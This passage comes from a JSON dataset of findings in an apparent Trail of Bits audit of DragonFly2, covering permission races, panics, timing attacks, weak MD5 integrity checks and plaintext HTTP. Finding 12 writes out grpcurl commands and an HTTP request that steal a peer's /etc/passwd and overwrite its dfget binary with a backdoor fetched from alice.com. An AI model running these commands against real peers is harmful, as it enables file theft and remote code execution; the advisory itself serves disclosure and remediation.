        "body": "DragonFly2 uses the os.MkdirAll function to create certain directory paths with specic access permissions. This function does not perform any permission checks when a given directory path already exists. This allows a local attacker to create a directory to be used later by DragonFly2 with broad permissions before DragonFly2 does so, potentially allowing the attacker to tamper with the les. Exploit Scenario Eve has unprivileged access to the machine where Alice uses DragonFly2. Eve watches the commands executed by Alice and introduces new directories/paths with 0777 permissions before DragonFly2 does so. Eve can then delete and forge les in that directory to change the results of further commands executed by Alice. Recommendations Short term, when using utilities such as os.MkdirAll , os.WriteFile , or outil.WriteFile , check all directories in the path and validate their owners and permissions before performing operations on them. This will help avoid situations where sensitive information is written to a pre-existing attacker-controlled path. Alternatively, explicitly call the chown and chmod methods on newly created les and permissions. We recommend making a wrapper method around le and directory creation functions that would handle pre-existence checks or would chain the previously mentioned methods. Long term, enumerate les and directories for their expected permissions overall, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the entire application.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Slicing operations with hard-coded indexes and without explicit length validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "In the buildDownloadPieceHTTPRequest and DownloadTinyFile methods (gures 6.1 and 6.2), there are array slicing operations with hard-coded indexes. If the arrays are smaller than the indexes, the code panics. This ndings severity is informational, as we were not able to trigger the panic with a request from an external actor. func (p *pieceDownloader) buildDownloadPieceHTTPRequest(ctx context.Context, d *DownloadPieceRequest) *http.Request { // FIXME switch to https when tls enabled targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , d.DstPid), p.scheme, d.DstAddr, fmt.Sprintf( \"download/%s/%s\" , d.TaskID[: 3 ], d.TaskID), } Figure 6.1: If d.TaskID length is less than 3, the code panics ( Dragonfly2/client/daemon/peer/piece_downloader.go#198205 ) func (p *Peer) DownloadTinyFile() ([] byte , error ) { ctx, cancel := context.WithTimeout(context.Background(), downloadTinyFileContextTimeout) defer cancel() // Download url: http://${host}:${port}/download/${taskIndex}/${taskID}?peerId=${peerID} targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , p.ID), \"http\" , fmt.Sprintf( \"%s:%d\" , p.Host.IP, p.Host.DownloadPort), fmt.Sprintf( \"download/%s/%s\" , p.Task.ID[: 3 ], p.Task.ID), } Figure 6.2: If p.Task.ID length is less than 3, the code panics ( Dragonfly2/scheduler/resource/peer.go#436446 ) Recommendations Short term, explicitly validate lengths of arrays before performing slicing operations with hard-coded indexes. If the arrays are known to always be of sucient size, add a comment in code to indicate this, so that further reviewers of the code will not have to triage this false positive. Long term, add fuzz testing to the codebase. This type of testing helps to identify missing data validation and inputs triggering panics.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Files are closed without error check ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "Several methods in the DragonFly2 codebase defer le close operations after writing to a le. This may introduce undened behavior, as the les content may not be ushed to disk until the le has been closed. Errors arising from the inability to ush content to disk while closing will not be caught, and the application may assume that content was written to disk successfully. See the example in gure 7.1. file, err := os.OpenFile(t.DataFilePath, os.O_RDWR, defaultFileMode) if err != nil { return 0 , err } defer file.Close() Figure 7.1: Part of the localTaskStore.WritePiece method ( Dragonfly2/client/daemon/storage/local_storage.go#124128 ) The bug occurs in multiple locations throughout the codebase. Exploit Scenario The server on which the DragonFly2 application runs has a disk that periodically fails to ush content due to a hardware failure. As a result, certain methods in the codebase sometimes fail to write content to disk. This causes undened behavior. Recommendations Short term, consider closing les explicitly at the end of functions and checking for errors. Alternatively, defer a wrapper function to close the le and check for errors if applicable. Long term, test the DragonFly2 system with failure injection technique. This technique works by randomly failing system-level calls (like the one responsible for writing a le to a disk) and checking if the application under test correctly handles the error. References  \"Don't defer Close() on writable les\" blog post  Security assessment techniques for Go projects, Fault injection chapter",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Timing attacks against Proxys basic authentication are possible ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The access control mechanism for the Proxy feature uses simple string comparisons and is therefore vulnerable to timing attacks. An attacker may try to guess the password one character at a time by sending all possible characters to a vulnerable mechanism and measuring the comparison instructions execution times. The vulnerability is shown in gure 8.1, where both the username and password are compared with a short-circuiting equality operation. if user != proxy.basicAuth.Username || pass != proxy.basicAuth.Password { Figure 8.1: Part of the ServeHTTP method with code line vulnerable to the timing attack ( Dragonfly2/client/daemon/proxy/proxy.go#316 ) It is currently undetermined what an attacker may be able to do with access to the proxy password. Recommendations Short term, replace the simple string comparisons used in the ServeHTTP method with constant-time comparisons. This will prevent the possibility of timing the comparison operation to leak passwords. Long term, use static analysis to detect code vulnerable to simple timing attacks. For example, use the CodeQLs go/timing-attack query . References   Timeless Timing Attacks : this presentation explains how timing attacks can be made more ecient. Go crypto/subtle ConstantTimeCompare method : this method implements a constant-time comparison.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Possible panics due to nil pointer dereference when using variables created alongside an error ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "We found two instances in the DragonFly codebase where the rst return value of a function is dereferenced even when the function returns an error (gures 9.1 and 9.2). This can result in a nil dereference, and cause code to panic . The codebase may contain additional instances of the bug. request, err := source.NewRequestWithContext(ctx, parentReq.Url, parentReq.UrlMeta.Header) if err != nil { log.Errorf( \"generate url [%v] request error: %v\" , request.URL, err) span.RecordError(err) return err } Figure 9.1: If there is an error, the request.URL variable is used even if the request is nil ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#621626 ) prefetch, err := ptm.getPeerTaskConductor(context.Background(), taskID, req, limit, nil , nil , desiredLocation, false ) if err != nil { logger.Errorf( \"prefetch peer task %s/%s error: %s\" , prefetch.taskID, prefetch.peerID, err) return nil } Figure 9.2: prefetch may be nil when there is an error, and trying to get prefetch.taskID can cause a nil dereference panic ( Dragonfly2/client/daemon/peer/peertask_manager.go#294298 ) Exploit Scenario Eve is a malicious actor operating a peer machine. She sends a dfdaemonv1.DownRequest request to her peer Alice. Alices machine receives the request, resolves a nil variable in the server.Download method, and panics. Recommendations Short term, change the error message code to avoid making incorrect dereferences. Long term, review codebase against this type of issue. Systematically use static analysis to detect this type of vulnerability. For example, use  Semgrep invalid-usage-of-modified-variable rule .",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. TrimLeft is used instead of TrimPrex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The strings.TrimLeft function is used at multiple points in the Dragony codebase to remove a prex from a string. This function has unexpected behavior; its second argument is an unordered set of characters to remove, rather than a prex to remove. The strings.TrimPrefix function should be used instead. The issues that were found are presented in gures 10.14. However, the codebase may contain additional issues of this type. urlMeta.Range = strings.TrimLeft(r, http.RangePrefix) Figure 10.1: Dragonfly2/scheduler/job/job.go#175 rg = strings.TrimLeft(r, \"bytes=\" ) Figure 10.2: Dragonfly2/client/dfget/dfget.go#226 urlMeta.Range = strings.TrimLeft(rangeHeader, \"bytes=\" ) Figure 10.3: Dragonfly2/client/daemon/objectstorage/objectstorage.go#288 meta.Range = strings.TrimLeft(rangeHeader, \"bytes=\" ) Figure 10.4: Dragonfly2/client/daemon/transport/transport.go#264 Figure 10.5 shows an example of the dierence in behavior between strings.TrimLeft and strings.TrimPrefix : strings.TrimLeft( \"bytes=bbef02\" , \"bytes=\" ) == \"f02\" strings.TrimPrefix( \"bytes=bbef02\" , \"bytes=\" ) == \"bbef02\" Figure 10.5: dierence in behavior between strings.TrimLeft and strings.TrimPrefix The nding is informational because we were unable to determine an exploitable attack scenario based on the vulnerability. Recommendations Short term, replace incorrect calls to string.TrimLeft method with calls to string.TrimPrefix . Long term, test DragonFly2 functionalities against invalid and malformed data, such HTTP headers that do not adhere to the HTTP specication.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Vertex.DeleteInEdges and Vertex.DeleteOutEdges functions are not thread safe ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The Vertex.DeleteInEdges and Vertex.DeleteOutEdges functions are not thread safe, and may cause inconsistent states if they are called at the same time as other functions. Figure 11.1 shows implementation of the Vertex.DeleteInEdges function. // DeleteInEdges deletes inedges of vertex. func (v *Vertex[T]) DeleteInEdges() { for _, parent := range v.Parents.Values() { parent.Children.Delete(v) } v.Parents = set.NewSafeSet[*Vertex[T]]() } Figure 11.1: The Vertex.DeleteInEdges method ( Dragonfly2/pkg/graph/dag/vertex.go#5461 ) The for loop iterates through the vertexs parents, deleting the corresponding entry in their Children sets. After the for loop, the vertexs Parents set is assigned to be the empty set. However, if a parent is added to the vertex (on another thread) in between these two operations, the state will be inconsistent. The parent will have the vertex in its Children set, but the vertex will not have the parent in its Parents set. The same problem happens in Vertex.DeleteOutEdges method, since its code is essentially the same, but with Parents swapped with Children in all occurrences. It is undetermined what exploitable problems this bug can cause. Recommendations Short term, give Vertex.DeleteInEdges and Vertex.DeleteOutEdges methods access to the DAG s mutex, and use mu.Lock to prevent other threads from accessing the DAG while Vertex.DeleteInEdges or Vertex.DeleteOutEdges is in progress. Long term, consider writing randomized stress tests for these sorts of bugs; perform many writes concurrently, and see if any data races or invalid states occur. References  Documentation on golangs data race detector",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Arbitrary le read and write on a peer machine ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "A peer exposes the gRPC API and HTTP API for consumption by other peers. These APIs allow peers to send requests that force the recipient peer to create les in arbitrary le system locations, and to read arbitrary les. This allows peers to steal other peers secret data and to gain remote code execution (RCE) capabilities on the peers machine. The gRPC API has, among others, the ImportTask and ExportTask endpoints (gure 12.1). The rst endpoint copies the le specied in the path argument (gures 12.2 and 12.3) to a directory pointed by the dataDir conguration variable (e.g., /var/lib/dragonfly ). // Daemon Client RPC Service service Daemon{ [skipped] // Import the given file into P2P cache system rpc ImportTask(ImportTaskRequest) returns (google.protobuf.Empty); // Export or download file from P2P cache system rpc ExportTask(ExportTaskRequest) returns (google.protobuf.Empty); [skipped] } Figure 12.1: Denition of the gRPC API exposed by a peer ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#113131 ) message ImportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // URL meta info. common.UrlMeta url_meta = 2 ; // File to be imported. string path = 3 [(validate.rules). string .min_len = 1 ]; // Task type. common.TaskType type = 4 ; } Figure 12.2: Arguments for the ImportTask endpoint ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#7685 ) file, err := os.OpenFile(t.DataFilePath, os.O_RDWR, defaultFileMode) if err != nil { return 0 , err } defer file.Close() if _, err = file.Seek(req.Range.Start, io.SeekStart); err != nil { return 0 , err } n, err := io.Copy(file, io.LimitReader(req.Reader, req.Range.Length)) Figure 12.3: Part of the WritePiece method (called by the handler of the ImportTask endpoint) that copies the content of a le ( Dragonfly2/client/daemon/storage/local_storage.go#124133 ) The second endpoint moves the previously copied le to a location provided by the output argument (gures 12.4 and 12.5). message ExportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // Output path of downloaded file. string output = 2 [(validate.rules). string .min_len = 1 ]; [skipped] } Figure 12.4: Arguments for the ExportTask endpoint ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#87104 ) dstFile, err := os.OpenFile(req.Destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, defaultFileMode) if err != nil { t.Errorf( \"open tasks destination file error: %s\" , err) return err } defer dstFile.Close() // copy_file_range is valid in linux // https://go-review.googlesource.com/c/go/+/229101/ n, err := io.Copy(dstFile, file) Figure 12.5: Part of the Store method (called by the handler of the ExportTask endpoint) that copies the content of a le; req.Destination equals the output argument ( Dragonfly2/client/daemon/storage/local_storage.go#396404 ) The HTTP API, called Upload Manager, exposes the /download/:task_prefix/:task_id endpoint. This endpoint can be used to read a le that was previously imported with the relevant gRPC API call. Exploit Scenario Alice (a peer in a DragonFly2 system) wants to steal the /etc/passwd le from Bob (another peer). Alice uses the command shown in gure 12.6 to make Bob import the le to a dataDir directory. grpcurl -plaintext -format json -d \\ '{\"url\":\"http://example.com\", \"path\":\"/etc/passwd\", \"urlMeta\":{\"digest\": \"md5:aaaff\", \"tag\":\"tob\"}}'$ BOB_IP:65000 dfdaemon.Daemon.ImportTask Figure 12.6: Command to steal /etc/passwd Next, she sends an HTTP request, similar to the one in gure 12.7, to Bob. Bob returns the content of his /etc/passwd le. GET /download/<prefix>/<sha256>?peerId=172.17.0.1-1-<tag> HTTP / 1.1 Host: $BOB_IP:55002 Range: bytes=0-100 Figure 12.7: Bobs response, revealing /etc/passwd contents Later, Alice uploads a malicious backdoor executable to the peer-to-peer network. Once Bob has downloaded (e.g., via the exportFromPeers method) and cached the backdoor le, Alice sends a request like the one shown in gure 12.8 to overwrite the /opt/dragonfly/bin/dfget binary with the backdoor. grpcurl -plaintext -format json -d \\ '{\"url\":\"http://alice.com/backdoor\", \"output\":\"/opt/dragonfly/bin/dfget\", \"urlMeta\":{\"digest\": \"md5:aaaff\", \"tag\":\"tob\"}}' $BOB_IP:65000 dfdaemon.Daemon.ExportTask Figure 12.8: Command to overwrite dfget binary After some time Bob restarts the dfget daemon, which executes Alices backdoor on his machine. Recommendations Short term, sandbox the DragonFly2 daemon, so that it can access only les within a certain directory. Mitigate path traversal attacks. Ensure that APIs exposed by peers cannot be used by malicious actors to gain arbitrary le read or write, code execution, HTTP request forgery, and other unintended capabilities.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Manager generates mTLS certicates for arbitrary IP addresses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "A peer can obtain a valid TLS certicate for arbitrary IP addresses, eectively rendering the mTLS authentication useless. The issue is that the Managers Certificate gRPC service does not validate if the requested IP addresses belong to the peer requesting the certicatethat is, if the peer connects from the same IP address as the one provided in the certicate request. Please note that the issue is known to developers and marked with TODO comments, as shown in gure 13.1. if addr, ok := p.Addr.(*net.TCPAddr); ok { ip = addr.IP.String() } else { ip, _, err = net.SplitHostPort(p.Addr.String()) if err != nil { return nil , err } } // Parse csr. [skipped] // Check csr signature. // TODO check csr common name and so on. if err = csr.CheckSignature(); err != nil { return nil , err } [skipped] // TODO only valid for peer ip // BTW we need support both of ipv4 and ipv6. ips := csr.IPAddresses if len (ips) == 0 { // Add default connected ip. ips = []net.IP{net.ParseIP(ip)} } Figure 13.1: The Managers Certificate gRPC handler for the IssueCertificate endpoint ( Dragonfly2/manager/rpcserver/security_server_v1.go#6598 ) Recommendations Short term, implement the missing IP addresses validation in the IssueCertificate endpoint of the Managers Certificate gRPC service. Ensure that a peer cannot obtain a certicate with an ID that does not belong to the peer. Long term, research common security problems in PKI infrastructures and ensure that DragonFly2s PKI does not have them. Ensure that if a peer IP address changes, the certicates issued for that IP are revoked.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. gRPC requests are weakly validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The gRPC requests are weakly validated, and some requests elds are not validated at all. For example, the ImportTaskRequest s url_meta eld is not validated and may be missing from a request (see gure 14.1). Sending requests to the ImportTask endpoint (as shown in gure 14.2) triggers the code shown in gure 14.3. The highlighted call to the logger accesses the req.UrlMeta.Tag variable, causing a nil dereference panic (because the req.UrlMeta variable is nil ). message ImportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // URL meta info. common.UrlMeta url_meta = 2 ; // File to be imported. string path = 3 [(validate.rules). string .min_len = 1 ]; // Task type. common.TaskType type = 4 ; } Figure 14.1: ImportTaskRequest denition, with the url_meta eld missing any validation rules ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#7685 ) grpcurl -plaintext -format json -d \\ '{\"url\":\"http://example.com\", \"path\":\"x\"}' $PEER_IP:65000 dfdaemon.Daemon.ImportTask Figure 14.2: An example command that triggers panic in the daemon gRPC server s.Keep() peerID := idgen.PeerIDV1(s.peerHost.Ip) taskID := idgen.TaskIDV1(req.Url, req.UrlMeta) log := logger.With( \"function\" , \"ImportTask\" , \"URL\" , req.Url, \"Tag\" , req.UrlMeta.Tag, \"taskID\" , taskID, \"file\" , req.Path) Figure 14.3: The req.UrlMeta variable may be nil ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#871874 ) Another example of weak validation can be observed in the denition of the UrlMeta request (gure 14.4). The digest eld of the request should contain a prex followed by an either MD5 or SHA256 hex-encoded hash. While prex and hex-encoding is validated, length of the hash is not. The length is validated only during the parsing . // UrlMeta describes url meta info. message UrlMeta { // Digest checks integrity of url content, for example md5:xxx or sha256:yyy. string digest = 1 [(validate.rules). string = {pattern: \"^(md5)|(sha256):[A-Fa-f0-9]+$\" , ignore_empty: true }]; Figure 14.4: The UrlMeta request denition, with a regex validation of the digest eld ( api/pkg/apis/common/v1/common.proto#163166 ) Recommendations Short term, add missing validations for the ImportTaskRequest and UrlMeta messages. Centralize validation of external inputs, so that it is easy to understand what properties are enforced on the data. Validate data as early as possible (for example, in the proto-related code). Long term, use fuzz testing to detect missing validations.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Weak integrity checks for downloaded les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The DragonFly2 uses a variety of hash functions, including the MD5 hash. This algorithm does not provide collision resistance; it is secure only against preimage attacks. While these security guarantees may be enough for the DragonFly2 system, it is not completely clear if there are any scenarios where lack of the collision resistance would compromise the system. There are no clear benets to keeping the MD5 hash function in the system. Figure 15.1 shows the core validation method that protects the integrity of les downloaded from the peer-to-peer network. As shown in the gure, the hash of a le (sha256) is computed over hashes of all les pieces (MD5). So the security provided by the more secure sha256 hash is lost, because of use of the MD5. var pieceDigests [] string for i := int32 ( 0 ); i < t.TotalPieces; i++ { pieceDigests = append (pieceDigests, t.Pieces[i].Md5) } digest := digest.SHA256FromStrings(pieceDigests...) if digest != t.PieceMd5Sign { t.Errorf( \"invalid digest, desired: %s, actual: %s\" , t.PieceMd5Sign, digest) t.invalid.Store( true ) return ErrInvalidDigest } Figure 15.1: Part of the method responsible for validation of les integrity ( Dragonfly2/client/daemon/storage/local_storage.go#255265 ) The MD5 algorithm is hard coded over the entire codebase (e.g., gure 15.2), but in some places the hash algorithm is congurable (e.g., gure 15.3). Further investigation is required to determine whether an attacker can exploit the congurability of the system to perform downgrade attacksthat is, to downgrade the security of the system by forcing users to use the MD5 algorithm, even when a more secure option is available. reader, err = digest.NewReader( digest.AlgorithmMD5 , io.LimitReader(resp.Body, int64 (req.piece.RangeSize)), digest.WithEncoded(req.piece.PieceMd5), digest.WithLogger(req.log)) Figure 15.2: Hardcoded hash function ( Dragonfly2/client/daemon/peer/piece_downloader.go#188 ) switch algorithm { case AlgorithmSHA1: if len (encoded) != 40 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmSHA256: if len (encoded) != 64 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmSHA512: if len (encoded) != 128 { return nil , errors.New( \"invalid encoded\" ) } case AlgorithmMD5: if len (encoded) != 32 { return nil , errors.New( \"invalid encoded\" ) } default : return nil , errors.New( \"invalid algorithm\" ) } Figure 15.3: User-congurable hash function ( Dragonfly2/pkg/digest/digest.go#111130 ) Moreover, there are missing validations of the integrity hashes, for example in the ImportTask method (gure 15.5). // TODO: compute and check hash digest if digest exists in ImportTaskRequest Figure 15.4: Missing hash validation ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#904 ) Exploit Scenario Alice, a peer in the DragonFly2 system, creates two images: an innocent one, and one with malicious code. Both images consist of two pieces, and Alice generates the pieces so that their respective MD5 hashes collide (are the same). Therefore, the PieceMd5Sign metadata of both images are equal. Alice shares the innocent image with other peers, who attest to their validity (i.e., that it works as expected and is not malicious). Bob wants to download the image and requests it from the peer-to-peer network. After downloading the image, Bob checks its integrity with a SHA256 hash that is known to him. Alice, who is participating in the network, had already provided Bob the other image, the malicious one. Bob unintentionally uses the malicious image. Recommendations Short term, remove support for the MD5. Always use SHA256, SHA3, or another secure hashing algorithm. Long term, take an inventory of all cryptographic algorithms used across the entire system. Ensure that no deprecated or non-recommended algorithms are used.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. Invalid error handling, missing return statement ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "There are two instances of a missing return statement inside an if branch that handles an error from a downstream method. The rst issue is in the UpdateTransportOption function, where failed parsing of the Proxy option prints an error, but does not terminate execution of the UpdateTransportOption function. func UpdateTransportOption(transport *http.Transport, optionYaml [] byte ) error { [skipped] if len (opt.Proxy) > 0 { proxy, err := url.Parse(opt.Proxy) if err != nil { fmt.Printf( \"proxy parse error: %s\\n\" , err) } transport.Proxy = http.ProxyURL(proxy) } Figure 16.1: the UpdateTransportOption function ( Dragonfly2/pkg/source/transport_option.go#4558 ) The second issue is in the GetV1Preheat method, where failed parsing of the rawID argument does not result in termination of the method execution. Instead, the id variable will be assigned either the zero or max_uint value. func (s *service) GetV1Preheat(ctx context.Context, rawID string ) (*types.GetV1PreheatResponse, error ) { id, err := strconv.ParseUint(rawID, 10 , 32 ) if err != nil { logger.Errorf( \"preheat convert error\" , err) } Figure 16.2: the GetV1Preheat function ( Dragonfly2/manager/service/preheat.go#6670 ) Recommendations Short term, add the missing return statements in the UpdateTransportOption method. Long term, use static analysis to detect similar bugs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Tiny le download uses hard coded HTTP protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The code in the scheduler for downloading a tiny le is hard coded to use the HTTP protocol, rather than HTTPS. This means that an attacker could perform a Man-in-the-Middle attack, changing the network request so that a dierent piece of data gets downloaded. Due to the use of weak integrity checks ( TOB-DF2-15 ), this modication of the data may go unnoticed. // DownloadTinyFile downloads tiny file from peer without range. func (p *Peer) DownloadTinyFile() ([] byte , error ) { ctx, cancel := context.WithTimeout(context.Background(), downloadTinyFileContextTimeout) defer cancel() // Download url: http://${host}:${port}/download/${taskIndex}/${taskID}?peerId=${peerID} targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , p.ID), \"http\" , fmt.Sprintf( \"%s:%d\" , p.Host.IP, p.Host.DownloadPort), fmt.Sprintf( \"download/%s/%s\" , p.Task.ID[: 3 ], p.Task.ID), } Figure 17.1: Hard-coded use of HTTP ( Dragonfly2/scheduler/resource/peer.go#435446 ) Exploit Scenario A network-level attacker who cannot join a peer-to-peer network performs a Man-in-the-Middle attack on peers. The adversary can do this because peers (partially) communicate over plaintext HTTP protocol. The attack chains this vulnerability with the one described in TOB-DF2-15 to replace correct les with malicious ones. Unconscious peers use the malicious les. Recommendations Short term, add a conguration option to use HTTPS for these downloads. Long term, audit the rest of the repository for other hard-coded uses of HTTP.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Incorrect log message ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The scheduler service may sometimes output two dierent logging messages stating two dierent reasons why a task is being registered as a normal task. The following code is used to register a peer and trigger a seed peer download task. // RegisterPeerTask registers peer and triggers seed peer download task. func (v *V1) RegisterPeerTask(ctx context.Context, req *schedulerv1.PeerTaskRequest) (*schedulerv1.RegisterResult, error ) { [skipped] // The task state is TaskStateSucceeded and SizeScope is not invalid. switch sizeScope { case commonv1.SizeScope_EMPTY: [skipped] case commonv1.SizeScope_TINY: // Validate data of direct piece. if !peer.Task.CanReuseDirectPiece() { direct piece is %d, content length is %d\" , len (task.DirectPiece), task.ContentLength.Load()) peer.Log.Warnf( \"register as normal task, because of length of break } result, err := v.registerTinyTask(ctx, peer) if err != nil { peer.Log.Warnf( \"register as normal task, because of %s\" , err.Error()) break } return result, nil case commonv1.SizeScope_SMALL: result, err := v.registerSmallTask(ctx, peer) if err != nil { peer.Log.Warnf( \"register as normal task, because of %s\" , err.Error()) break } return result, nil } result, err := v.registerNormalTask(ctx, peer) if err != nil { peer.Log.Error(err) v.handleRegisterFailure(ctx, peer) return nil , dferrors.New(commonv1.Code_SchedError, err.Error()) } peer.Log.Info( \"register as normal task, because of invalid size scope\" ) return result, nil } Figure 18.1: Code snippet with incorrect logging ( Dragonfly2/scheduler/service/service_v1.go#93173 ) Each of the highlighted sets of lines above print register as normal task, because [reason], before exiting from the switch statement. Then, the task is registered as a normal task. Finally, another message is logged: register as normal task, because of invalid size scope. This means that two dierent messages may be printed (one as a warning message, one as an informational message) with two contradicting reasons for why the task was registered as a normal task. This does not cause any security problems directly but may lead to diculties while managing a DragonFly system or debugging DragonFly code. Recommendations Short term, move the peer.Log.Info function call into a default branch in the switch statement so that it is called only when the size scope is invalid.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Manager makes requests to external endpoints with disabled TLS authentication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The Manager disables TLS certicate verication in two HTTP clients (gures 3.1 and 3.2). The clients are not congurable, so users have no way to re-enable the verication. func getAuthToken(ctx context.Context, header http.Header) ( string , error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.1: getAuthToken function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#261301 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.2: getManifests function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#211233 ) Exploit Scenario A Manager processes dozens of preheat jobs. An adversary performs a network-level Man-in-the-Middle attack, providing invalid data to the Manager. The Manager preheats with the wrong data, which later causes a denial of service and le integrity problems. Recommendations Short term, make the TLS certicate verication congurable in the getManifests and getAuthToken methods. Preferably, enable the verication by default. Long term, enumerate all HTTP, gRPC, and possibly other clients that use TLS and document their congurable and non-congurable (hard-coded) settings. Ensure that all security-relevant settings are congurable or set to secure defaults. Keep the list up to date with the code.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Incorrect handling of a task structures usedTra\u0000c eld ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The processPieceFromSource method (gure 4.1) is part of a task processing mechanism. The method writes pieces of data to storage, updating a Task structure along the way. The method does not update the structures usedTraffic eld, because an uninitialized variable n is used as a guard to the AddTraffic method call, instead of the result.Size variable. var n int64 result.Size, err = pt.GetStorage().WritePiece( [skipped] ) result.FinishTime = time.Now().UnixNano() if n > 0 { pt.AddTraffic( uint64 (n)) } Figure 4.1: Part of the processPieceFromSource method with a bug ( Dragonfly2/client/daemon/peer/piece_manager.go#264290 ) Exploit Scenario A task is processed by a peer. The usedTraffic metadata is not updated during the processing. Rate limiting is incorrectly applied, leading to a denial-of-service condition for the peer. Recommendations Short term, replace the n variable with the result.Size variable in the processPieceFromSource method. Long term, add tests for checking if all Task structure elds are correctly updated during task processing. Add similar tests for other structures.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Usage of architecture-dependent int type ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf",
        "body": "The DragonFly2 uses int and uint numeric types in its golang codebase. These types bit sizes are either 32 or 64 bits, depending on the hardware where the code is executed. Because of that, DragonFly2 components running on dierent architectures may behave dierently. These discrepancies in behavior may lead to unexpected crashes of some components or incorrect data handling. For example, the handlePeerSuccess method casts peer.Task.ContentLength variable to the int type. Schedulers running on dierent machines may behave dierently, because of this behavior. if len (data) != int (peer.Task.ContentLength.Load()) { peer.Log.Errorf( \"download tiny task length of data is %d, task content length is %d\" , len (data), peer.Task.ContentLength.Load()) return } Figure 19.1: example use of architecture-dependent int type ( Dragonfly2/scheduler/service/service_v1.go#12401243 ) Recommendations Short term, use a xed bit size for all integer values. Alternatively, ensure that using the int type will not impact any computing where results must agree on all participants computers. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
